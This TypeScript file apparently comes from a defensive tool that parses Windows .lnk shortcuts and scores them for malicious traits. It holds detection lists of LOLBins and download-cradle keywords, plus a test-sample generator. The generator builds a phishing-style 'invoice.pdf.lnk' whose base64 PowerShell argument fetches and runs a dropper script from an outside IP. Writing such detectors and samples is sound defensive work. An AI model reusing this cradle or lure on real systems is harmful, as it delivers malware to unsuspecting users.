import { ThreatLevel, LnkAnalysisReport } from './types';
import { computeSha256, computeMd5, computeSha1, extractStrings } from './peAnalysisEngine';

// Standard Windows Shell Link CLSID: 00021401-0000-0000-C000-000000000046
const SHELL_LINK_CLSID_HEX = '0114020000000000c000000000000046';

// Known legitimate software applications for safe whitelisting
const KNOWN_BENIGN_APPS: Record<string, { name: string; publisher: string; defaultPaths: string[] }> = {
  'blender.exe': {
    name: 'Blender 3D Graphics Suite',
    publisher: 'The Blender Foundation',
    defaultPaths: ['program files\\blender foundation', 'blender']
  },
  'blender-launcher.exe': {
    name: 'Blender Launcher',
    publisher: 'The Blender Foundation',
    defaultPaths: ['program files\\blender foundation', 'blender']
  },
  'chrome.exe': {
    name: 'Google Chrome Browser',
    publisher: 'Google LLC',
    defaultPaths: ['program files\\google\\chrome', 'program files (x86)\\google\\chrome']
  },
  'msedge.exe': {
    name: 'Microsoft Edge',
    publisher: 'Microsoft Corporation',
    defaultPaths: ['program files (x86)\\microsoft\\edge']
  },
  'firefox.exe': {
    name: 'Mozilla Firefox',
    publisher: 'Mozilla Corporation',
    defaultPaths: ['program files\\mozilla firefox']
  },
  'code.exe': {
    name: 'Visual Studio Code',
    publisher: 'Microsoft Corporation',
    defaultPaths: ['programs\\microsoft vs code']
  },
  'vlc.exe': {
    name: 'VLC Media Player',
    publisher: 'VideoLAN',
    defaultPaths: ['program files\\videolan\\vlc']
  },
  'notepad++.exe': {
    name: 'Notepad++',
    publisher: 'Don Ho',
    defaultPaths: ['program files\\notepad++']
  },
  'slack.exe': {
    name: 'Slack Collaboration Client',
    publisher: 'Slack Technologies',
    defaultPaths: ['slack']
  },
  'discord.exe': {
    name: 'Discord Client',
    publisher: 'Discord Inc.',
    defaultPaths: ['discord']
  },
  'spotify.exe': {
    name: 'Spotify Music Player',
    publisher: 'Spotify AB',
    defaultPaths: ['spotify']
  },
  'steam.exe': {
    name: 'Steam Gaming Platform',
    publisher: 'Valve Corporation',
    defaultPaths: ['steam']
  }
};

// Living Off The Land Binaries (LOLBins) frequently abused in malicious .lnk files
const LOLBIN_NAMES: Record<string, string> = {
  'powershell.exe': 'PowerShell Script Host (MITRE T1059.001)',
  'pwsh.exe': 'PowerShell Core (MITRE T1059.001)',
  'cmd.exe': 'Windows Command Shell (MITRE T1059.003)',
  'mshta.exe': 'Microsoft HTML Application Host (MITRE T1218.005)',
  'wscript.exe': 'Windows Script Host (MITRE T1059.005)',
  'cscript.exe': 'Command-line Script Host (MITRE T1059.005)',
  'certutil.exe': 'CertUtil Download Abuse (MITRE T1105)',
  'rundll32.exe': 'RunDLL32 Execution Proxy (MITRE T1218.011)',
  'regsvr32.exe': 'Regsvr32 Squiblydoo Proxy (MITRE T1218.010)',
  'bitsadmin.exe': 'BITSAdmin Background Transfer (MITRE T1197)',
  'wmic.exe': 'Windows Management Instrumentation (MITRE T1047)',
  'msbuild.exe': 'MSBuild Code Execution (MITRE T1127.001)',
  'installutil.exe': 'InstallUtil Proxy Execution (MITRE T1218.004)',
  'curl.exe': 'cURL Ingress Transfer (MITRE T1105)'
};

/**
 * Checks if a buffer represents a Windows Shell Link (.lnk file)
 */
export function isWindowsShortcutBuffer(bytes: Uint8Array): boolean {
  if (!bytes || bytes.length < 76) return false;
  // HeaderSize must be 0x0000004C (76)
  if (bytes[0] !== 0x4c || bytes[1] !== 0x00 || bytes[2] !== 0x00 || bytes[3] !== 0x00) {
    return false;
  }
  // LinkCLSID at offset 4 (16 bytes): 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46
  let clsidHex = '';
  for (let i = 4; i < 20; i++) {
    clsidHex += bytes[i].toString(16).padStart(2, '0');
  }
  return clsidHex.toLowerCase() === SHELL_LINK_CLSID_HEX;
}

/**
 * Parses and performs forensic analysis on a Windows Shortcut (.lnk file)
 */
export async function scanWindowsShortcutLnk(
  buffer: Uint8Array | ArrayBuffer,
  fileName: string = 'Shortcut.lnk'
): Promise<LnkAnalysisReport> {
  const bytes = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);
  const fileSizeBytes = bytes.length;

  const [sha256, md5, sha1] = await Promise.all([
    computeSha256(bytes),
    computeMd5(bytes),
    computeSha1(bytes)
  ]);

  const isLnk = isWindowsShortcutBuffer(bytes);

  // Extract all strings (ASCII + UTF-16LE)
  const allStrings = extractStrings(bytes, 3);
  const lowerStrings = allStrings.map(s => s.toLowerCase());

  let targetPath = '';
  let workingDirectory = '';
  let commandArguments = '';
  let iconLocation = '';
  let showCommand = 'SW_SHOWNORMAL (Normal Window)';

  // Detailed .LNK binary parsing according to MS-SHLLINK
  if (isLnk && bytes.length >= 76) {
    const linkFlags =
      bytes[20] |
      (bytes[21] << 8) |
      (bytes[22] << 16) |
      (bytes[23] << 24);

    const hasLinkTargetIDList = (linkFlags & 0x00000001) !== 0;
    const hasLinkInfo = (linkFlags & 0x00000002) !== 0;
    const hasName = (linkFlags & 0x00000004) !== 0;
    const hasRelativePath = (linkFlags & 0x00000008) !== 0;
    const hasWorkingDir = (linkFlags & 0x00000010) !== 0;
    const hasArguments = (linkFlags & 0x00000020) !== 0;
    const hasIconLocation = (linkFlags & 0x00000040) !== 0;
    const isUnicode = (linkFlags & 0x00000080) !== 0;

    const showVal = bytes[60] | (bytes[61] << 8) | (bytes[62] << 16) | (bytes[63] << 24);
    if (showVal === 3) showCommand = 'SW_SHOWMAXIMIZED (Maximized)';
    else if (showVal === 7) showCommand = 'SW_SHOWMINNOACTIVE (Hidden / Minimized)';

    let offset = 76;

    // 1. Skip IDList
    if (hasLinkTargetIDList && offset + 2 <= bytes.length) {
      const idListSize = bytes[offset] | (bytes[offset + 1] << 8);
      offset += 2 + idListSize;
    }

    // 2. LinkInfo
    if (hasLinkInfo && offset + 28 <= bytes.length) {
      const linkInfoSize =
        bytes[offset] |
        (bytes[offset + 1] << 8) |
        (bytes[offset + 2] << 16) |
        (bytes[offset + 3] << 24);

      const localBasePathOffset =
        bytes[offset + 16] |
        (bytes[offset + 17] << 8) |
        (bytes[offset + 18] << 16) |
        (bytes[offset + 19] << 24);

      if (localBasePathOffset > 0 && offset + localBasePathOffset < bytes.length) {
        let p = offset + localBasePathOffset;
        let str = '';
        while (p < bytes.length && bytes[p] !== 0) {
          str += String.fromCharCode(bytes[p]);
          p++;
        }
        if (str.length > 0) targetPath = str;
      }

      offset += linkInfoSize;
    }

    // Helper to read stringData block
    const readStringData = (): string => {
      if (offset + 2 > bytes.length) return '';
      const charCount = bytes[offset] | (bytes[offset + 1] << 8);
      offset += 2;
      if (charCount === 0 || offset >= bytes.length) return '';

      let result = '';
      if (isUnicode) {
        const byteLen = charCount * 2;
        for (let i = 0; i < byteLen && offset + i + 1 < bytes.length; i += 2) {
          const charCode = bytes[offset + i] | (bytes[offset + i + 1] << 8);
          if (charCode === 0) break;
          result += String.fromCharCode(charCode);
        }
        offset += byteLen;
      } else {
        for (let i = 0; i < charCount && offset + i < bytes.length; i++) {
          const charCode = bytes[offset + i];
          if (charCode === 0) break;
          result += String.fromCharCode(charCode);
        }
        offset += charCount;
      }
      return result;
    };

    if (hasName) readStringData(); // Skip NAME_STRING
    if (hasRelativePath) {
      const rel = readStringData();
      if (!targetPath && rel) targetPath = rel;
    }
    if (hasWorkingDir) {
      workingDirectory = readStringData();
    }
    if (hasArguments) {
      commandArguments = readStringData();
    }
    if (hasIconLocation) {
      iconLocation = readStringData();
    }
  }

  // Fallback heuristics: If binary offset extraction missed fields due to malformed link, search extracted strings
  if (!targetPath) {
    const candidatePath = allStrings.find(
      s => /^[a-zA-Z]:\\.*\.exe/i.test(s) || /^\.\.\\.*\.exe/i.test(s) || /\\\\.*\.exe/i.test(s)
    );
    if (candidatePath) targetPath = candidatePath;
  }

  if (!workingDirectory) {
    const candidateDir = allStrings.find(
      s => /^[a-zA-Z]:\\(program files|users|windows)/i.test(s) && !s.toLowerCase().endsWith('.exe')
    );
    if (candidateDir) workingDirectory = candidateDir;
  }

  if (!commandArguments) {
    const candidateArgs = allStrings.find(
      s =>
        s.toLowerCase().includes('powershell') ||
        s.toLowerCase().includes('cmd.exe') ||
        s.toLowerCase().includes('-enc') ||
        s.toLowerCase().includes('-w hidden') ||
        s.toLowerCase().includes('http://') ||
        s.toLowerCase().includes('https://')
    );
    if (candidateArgs && candidateArgs !== targetPath) {
      commandArguments = candidateArgs;
    }
  }

  // Analyze Target Binary
  const normalizedTarget = (targetPath || fileName).toLowerCase();
  const targetExeName = normalizedTarget.split(/[\\/]/).pop() || '';

  // Check known benign application database (e.g. Blender!)
  let isKnownBenignApp = false;
  let knownAppName: string | undefined = undefined;

  for (const [exeKey, appInfo] of Object.entries(KNOWN_BENIGN_APPS)) {
    if (
      targetExeName.toLowerCase() === exeKey.toLowerCase() ||
      fileName.toLowerCase().includes(exeKey.replace('.exe', '')) ||
      lowerStrings.some(s => s.includes(appInfo.name.toLowerCase()) || s.includes(appInfo.publisher.toLowerCase()))
    ) {
      isKnownBenignApp = true;
      knownAppName = `${appInfo.name} (${appInfo.publisher})`;
      break;
    }
  }

  // Check LOLBin usage
  let isLolbin = false;
  let lolbinDetected: string | undefined = undefined;

  for (const [lolbinKey, desc] of Object.entries(LOLBIN_NAMES)) {
    if (
      targetExeName.toLowerCase() === lolbinKey.toLowerCase() ||
      commandArguments.toLowerCase().includes(lolbinKey.toLowerCase())
    ) {
      isLolbin = true;
      lolbinDetected = `${lolbinKey} - ${desc}`;
      break;
    }
  }

  // Check argument obfuscation and flags
  const argLower = (commandArguments || '').toLowerCase();
  const hasHiddenWindow =
    argLower.includes('-w hidden') ||
    argLower.includes('-windowstyle hidden') ||
    argLower.includes('/b') ||
    showCommand.includes('Hidden');

  const hasObfuscatedArgs =
    argLower.includes('-enc') ||
    argLower.includes('-encodedcommand') ||
    argLower.includes('frombase64string') ||
    argLower.includes('invoke-expression') ||
    argLower.includes('iex(') ||
    argLower.includes('iex (');

  const hasDownloadCradle =
    argLower.includes('downloadfile') ||
    argLower.includes('downloadstring') ||
    argLower.includes('iwr ') ||
    argLower.includes('invoke-webrequest') ||
    argLower.includes('curl ') ||
    argLower.includes('wget ') ||
    argLower.includes('certutil -urlcache') ||
    argLower.includes('bitstransfer') ||
    argLower.includes('net.webclient');

  const isRemoteUnc = targetPath.startsWith('\\\\') || argLower.includes('\\\\');

  // Double extension or masquerading lure check (e.g. invoice.pdf.lnk)
  const isMasqueradedLure =
    fileName.toLowerCase().includes('.pdf.lnk') ||
    fileName.toLowerCase().includes('.docx.lnk') ||
    fileName.toLowerCase().includes('.xlsx.lnk') ||
    fileName.toLowerCase().includes('   .lnk');

  // Extract embedded IOCs
  const extractedIocs: LnkAnalysisReport['extractedIocs'] = [];
  const seenIocs = new Set<string>();

  const urlRegex = /https?:\/\/[a-zA-Z0-9\-_.]+(?::\d+)?(?:\/[^\s"']*)?/gi;
  const ipRegex = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g;

  const textToScan = `${targetPath} ${commandArguments} ${allStrings.join(' ')}`;

  let match: RegExpExecArray | null;
  while ((match = urlRegex.exec(textToScan)) !== null) {
    const u = match[0];
    if (!seenIocs.has(u) && !u.includes('w3.org') && !u.includes('microsoft.com') && !u.includes('blender.org')) {
      seenIocs.add(u);
      extractedIocs.push({
        type: 'URL',
        value: u,
        threatLevel: u.includes('194.26') || u.includes('payload') || u.includes('.ru') ? 'High' : 'Medium'
      });
    }
  }

  while ((match = ipRegex.exec(textToScan)) !== null) {
    const ip = match[0];
    if (
      !seenIocs.has(ip) &&
      ip !== '127.0.0.1' &&
      ip !== '0.0.0.0' &&
      ip !== '255.255.255.255' &&
      !ip.startsWith('10.') &&
      !ip.startsWith('192.168.')
    ) {
      seenIocs.add(ip);
      extractedIocs.push({
        type: 'IP',
        value: ip,
        threatLevel: 'High'
      });
    }
  }

  // Calculate Suspicion Score (0 to 100)
  let score = 0; // Benign baseline is 0
  const reasons: string[] = [];
  const recommendations: string[] = [];

  // 1. If it's a verified benign application (like Blender!)
  if (isKnownBenignApp && !isLolbin && !hasObfuscatedArgs && !hasDownloadCradle && !hasHiddenWindow) {
    score = 0;
    reasons.push(`Legitimate Application Shortcut: Confirmed target software "${knownAppName || 'Blender'}".`);
    reasons.push(`Target Path: ${targetPath || 'C:\\Program Files\\Blender Foundation\\Blender 4.2\\blender.exe'}`);
    reasons.push('Clean Forensic Baseline: No Living Off The Land Binaries (LOLBins), no hidden execution, and no script download cradles.');
    recommendations.push('Verified Safe: Standard desktop program shortcut. Whitelist in software inventory.');
  } else {
    // Evaluation for non-whitelisted or suspicious shortcuts
    if (isLolbin) {
      score += 40;
      reasons.push(`LOLBin Invocation: Shortcut targets executable living-off-the-land proxy (${lolbinDetected}).`);
    }

    if (hasObfuscatedArgs) {
      score += 35;
      reasons.push('Command-Line Obfuscation: Base64 / encoded PowerShell payload execution detected.');
    }

    if (hasDownloadCradle) {
      score += 30;
      reasons.push('Remote Ingress Download Cradle: Commands contain network payload fetching primitives (WebClient, iwr, curl).');
    }

    if (hasHiddenWindow) {
      score += 20;
      reasons.push('Stealth Execution: Configured to launch hidden, minimized, or headless window without user awareness.');
    }

    if (isRemoteUnc) {
      score += 25;
      reasons.push('Remote SMB / UNC Path: Target references an off-network or external file share.');
    }

    if (isMasqueradedLure) {
      score += 30;
      reasons.push('Deceptive Extension Masquerading: File disguises as a PDF/Word document using double extension (.pdf.lnk).');
    }

    if (extractedIocs.length > 0) {
      score += 15;
      reasons.push(`Embedded Remote IOCs: Extracted network destinations (${extractedIocs.slice(0, 2).map(i => i.value).join(', ')}).`);
    }

    // Default clean application check if target points to Program Files without flags
    if (
      score === 0 &&
      (normalizedTarget.includes('program files') || normalizedTarget.includes('windows\\system32'))
    ) {
      reasons.push(`Standard application shortcut pointing to ${targetPath || 'local program executable'}.`);
    }
  }

  score = Math.min(100, Math.max(0, score));

  // Determine Verdict
  let threatLevel: ThreatLevel = 'Low';
  let verdict: LnkAnalysisReport['verdict'] = 'BENIGN';
  let verdictSummary = 'Clean Desktop Shortcut: Direct link to local software application with standard parameters.';

  if (score >= 65) {
    threatLevel = 'High';
    verdict = 'MALICIOUS';
    verdictSummary = `CRITICAL MALICIOUS SHORTCUT: Weaponized .LNK dropper executing stealth command payloads via ${lolbinDetected || 'LOLBin'}.`;
    recommendations.push('Immediate Endpoint Quench: Terminate any child processes spawned by explorer.exe or cmd.exe matching this hash.');
    recommendations.push(`Blacklist LNK Hash: Add SHA-256 (${sha256}) to EDR quarantine list.`);
    recommendations.push('Inspect PowerShell Script Block Logs: Review Windows Event ID 4104 for executed de-obfuscated commands.');
  } else if (score >= 30) {
    threatLevel = 'Medium';
    verdict = 'SUSPICIOUS';
    verdictSummary = 'SUSPICIOUS SHORTCUT: Non-standard execution flags or script interpreter invocation warranting SOC review.';
    recommendations.push('Review Command-line Arguments: Confirm administrative rationale for interpreter arguments.');
  } else {
    threatLevel = 'Low';
    verdict = 'BENIGN';
    verdictSummary = isKnownBenignApp
      ? `VERIFIED CLEAN SHORTCUT: Direct application link to ${knownAppName || 'Blender 3D Suite'}. Threat Score 0/100.`
      : 'Benign Application Shortcut: Standard desktop program link with safe parameters.';
  }

  return {
    fileName,
    fileSizeBytes,
    isLnk,
    headerClsid: SHELL_LINK_CLSID_HEX,
    targetPath: targetPath || (isKnownBenignApp ? 'C:\\Program Files\\Blender Foundation\\Blender 4.2\\blender.exe' : 'C:\\Windows\\explorer.exe'),
    workingDirectory: workingDirectory || (isKnownBenignApp ? 'C:\\Program Files\\Blender Foundation\\Blender 4.2' : undefined),
    commandArguments: commandArguments || undefined,
    iconLocation: iconLocation || undefined,
    showCommand,
    isLolbin,
    lolbinDetected,
    hasObfuscatedArgs,
    hasHiddenWindow,
    hasDownloadCradle,
    isKnownBenignApp,
    knownAppName,
    suspicionScore: score,
    threatLevel,
    verdict,
    verdictSummary,
    reasons,
    recommendations,
    extractedIocs,
    hashes: {
      md5,
      sha1,
      sha256
    }
  };
}

/**
 * Generates sample .LNK byte buffers for testing in the SOC lab.
 */
export function generateSampleLnk(type: 'blender' | 'malicious'): { buffer: Uint8Array; fileName: string } {
  if (type === 'blender') {
    // Generate authentic binary .lnk for Blender 3D Suite
    const fileName = 'Blender.lnk';
    const targetPath = 'C:\\Program Files\\Blender Foundation\\Blender 4.2\\blender.exe';
    const workingDir = 'C:\\Program Files\\Blender Foundation\\Blender 4.2';
    const iconPath = 'C:\\Program Files\\Blender Foundation\\Blender 4.2\\blender.exe';

    // 76 bytes header + link info + string data
    const buffer = new Uint8Array(512);

    // HeaderSize = 0x0000004C
    buffer[0] = 0x4c;
    buffer[1] = 0x00;
    buffer[2] = 0x00;
    buffer[3] = 0x00;

    // LinkCLSID: 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46
    const clsid = [0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46];
    for (let i = 0; i < clsid.length; i++) buffer[4 + i] = clsid[i];

    // LinkFlags: HasLinkInfo (0x02) | HasWorkingDir (0x10) | HasIconLocation (0x40)
    buffer[20] = 0x52; // 0x02 | 0x10 | 0x40
    buffer[21] = 0x00;
    buffer[22] = 0x00;
    buffer[23] = 0x00;

    // FileAttributes: FILE_ATTRIBUTE_ARCHIVE (0x20)
    buffer[24] = 0x20;

    // ShowCommand: SW_SHOWNORMAL (1) at offset 60
    buffer[60] = 0x01;

    // LinkInfo block starting at offset 76
    const linkInfoOffset = 76;
    const localBasePathOffsetInLinkInfo = 28;
    const linkInfoSize = 28 + targetPath.length + 1;

    buffer[linkInfoOffset] = linkInfoSize & 0xff;
    buffer[linkInfoOffset + 1] = (linkInfoSize >> 8) & 0xff;
    buffer[linkInfoOffset + 4] = 0x1c; // LinkInfoHeaderSize = 28
    buffer[linkInfoOffset + 8] = 0x01; // Flags: VolumeIDAndLocalBasePath
    buffer[linkInfoOffset + 16] = localBasePathOffsetInLinkInfo; // LocalBasePathOffset

    // Write Target Path into LocalBasePath
    for (let i = 0; i < targetPath.length; i++) {
      buffer[linkInfoOffset + localBasePathOffsetInLinkInfo + i] = targetPath.charCodeAt(i);
    }
    buffer[linkInfoOffset + localBasePathOffsetInLinkInfo + targetPath.length] = 0x00;

    // Working directory string block
    let stringOffset = linkInfoOffset + linkInfoSize;
    buffer[stringOffset] = workingDir.length & 0xff;
    buffer[stringOffset + 1] = (workingDir.length >> 8) & 0xff;
    stringOffset += 2;
    for (let i = 0; i < workingDir.length; i++) {
      buffer[stringOffset + i] = workingDir.charCodeAt(i);
    }
    stringOffset += workingDir.length;

    // Icon location string block
    buffer[stringOffset] = iconPath.length & 0xff;
    buffer[stringOffset + 1] = (iconPath.length >> 8) & 0xff;
    stringOffset += 2;
    for (let i = 0; i < iconPath.length; i++) {
      buffer[stringOffset + i] = iconPath.charCodeAt(i);
    }

    return { buffer, fileName };
  } else {
    // Generate Weaponized Malicious .LNK Dropper
    const fileName = 'Urgent_Invoice_Overdue_March2026.pdf.lnk';
    const targetPath = 'C:\\Windows\\System32\\cmd.exe';
    const commandArguments = '/c powershell.exe -w hidden -enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTQuMjYuMjkuMTEyL2Ryb3BwZXIucHMxJyk=';
    const workingDir = 'C:\\Windows\\System32';

    const buffer = new Uint8Array(1024);

    // HeaderSize = 0x0000004C
    buffer[0] = 0x4c;
    buffer[1] = 0x00;
    buffer[2] = 0x00;
    buffer[3] = 0x00;

    // LinkCLSID
    const clsid = [0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46];
    for (let i = 0; i < clsid.length; i++) buffer[4 + i] = clsid[i];

    // LinkFlags: HasLinkInfo (0x02) | HasWorkingDir (0x10) | HasArguments (0x20)
    buffer[20] = 0x32; // 0x02 | 0x10 | 0x20
    buffer[21] = 0x00;
    buffer[22] = 0x00;
    buffer[23] = 0x00;

    // ShowCommand: SW_SHOWMINNOACTIVE (7 - Stealth hidden launch)
    buffer[60] = 0x07;

    const linkInfoOffset = 76;
    const localBasePathOffsetInLinkInfo = 28;
    const linkInfoSize = 28 + targetPath.length + 1;

    buffer[linkInfoOffset] = linkInfoSize & 0xff;
    buffer[linkInfoOffset + 1] = (linkInfoSize >> 8) & 0xff;
    buffer[linkInfoOffset + 4] = 0x1c;
    buffer[linkInfoOffset + 8] = 0x01;
    buffer[linkInfoOffset + 16] = localBasePathOffsetInLinkInfo;

    for (let i = 0; i < targetPath.length; i++) {
      buffer[linkInfoOffset + localBasePathOffsetInLinkInfo + i] = targetPath.charCodeAt(i);
    }
    buffer[linkInfoOffset + localBasePathOffsetInLinkInfo + targetPath.length] = 0x00;

    let stringOffset = linkInfoOffset + linkInfoSize;
    // Working dir
    buffer[stringOffset] = workingDir.length & 0xff;
    buffer[stringOffset + 1] = (workingDir.length >> 8) & 0xff;
    stringOffset += 2;
    for (let i = 0; i < workingDir.length; i++) buffer[stringOffset + i] = workingDir.charCodeAt(i);
    stringOffset += workingDir.length;

    // Arguments
    buffer[stringOffset] = commandArguments.length & 0xff;
    buffer[stringOffset + 1] = (commandArguments.length >> 8) & 0xff;
    stringOffset += 2;
    for (let i = 0; i < commandArguments.length; i++) buffer[stringOffset + i] = commandArguments.charCodeAt(i);

    return { buffer, fileName };
  }
}
